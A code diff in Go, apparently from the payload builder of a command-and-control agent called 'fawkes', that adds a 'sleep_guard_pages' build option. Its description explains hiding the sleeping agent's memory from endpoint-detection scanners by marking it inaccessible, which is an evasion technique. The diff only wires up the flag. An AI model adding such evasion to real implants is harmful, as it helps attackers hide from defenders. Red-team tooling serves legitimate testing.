@@ -379,6 +379,13 @@ var payloadDefinition = agentstructs.PayloadType{
 			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
 		},
 		{
+			Name:          "sleep_guard_pages",
+			Description:   "Protect sleep vault memory with PAGE_NOACCESS during sleep. After encrypting sensitive data, vault pages are VirtualProtect'd to NO_ACCESS — EDR memory scanners get STATUS_ACCESS_VIOLATION when scanning agent memory during sleep. Requires sleep_mask=true. Windows only.",
+			Required:      false,
+			DefaultValue:  false,
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
+		},
+		{
 			Name:          "kill_date",
 			Description:   "Optional: UTC date/time after which the agent will self-terminate (format: YYYY-MM-DD or YYYY-MM-DD HH:MM). Leave empty for no kill date. Enforced every tasking cycle.",
 			Required:      false,
@@ -725,6 +732,9 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 	}
 	if slpMask, err := payloadBuildMsg.BuildParameters.GetBooleanArg("sleep_mask"); err == nil && slpMask {
 		ldflags += fmt.Sprintf(" -X '%s.sleepMask=true'", fawkes_main_package)
+	}
+	if slpGuard, err := payloadBuildMsg.BuildParameters.GetBooleanArg("sleep_guard_pages"); err == nil && slpGuard {
+		ldflags += fmt.Sprintf(" -X '%s.sleepGuardPages=true'", fawkes_main_package)
 	}
 
 	// Kill date: parse date string to Unix timestamp
